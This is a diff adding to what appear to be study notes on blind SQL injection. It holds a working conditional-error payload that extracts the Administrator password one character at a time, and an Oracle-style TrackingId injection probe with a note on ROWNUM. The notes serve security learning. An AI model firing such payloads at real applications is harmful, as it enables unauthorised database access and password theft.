@@ -105,8 +105,33 @@ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator')
 
 #### Exploiting blind SQL injection by triggering conditional errors
 
+```sql
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
 
+step：
+
+```
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+```
+
+`WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.
 
 
 
 #### Extracting sensitive data via verbose SQL error messages
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
